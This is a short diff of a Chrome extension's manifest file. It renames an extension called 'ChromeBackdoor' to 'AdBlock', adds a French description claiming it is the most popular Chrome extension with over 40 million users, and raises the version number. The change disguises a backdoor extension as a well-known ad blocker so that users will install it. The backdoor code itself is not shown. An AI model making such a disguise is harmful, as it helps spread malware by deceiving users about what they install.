@@ -1,7 +1,7 @@
 {
-    "name": "ChromeBackdoor",
-    "description": "https://github.com/graniet/",
-    "version": "1.0",
+    "name": "AdBlock",
+    "description": "La plus populaire des extensions Chrome, avec plus de 40 millions d'utilisateurs ! \n Bloque la publicité sur le web.",
+    "version": "2.44",
     "manifest_version": 2,
     "icons": { 
     "16": "img/ico.png",
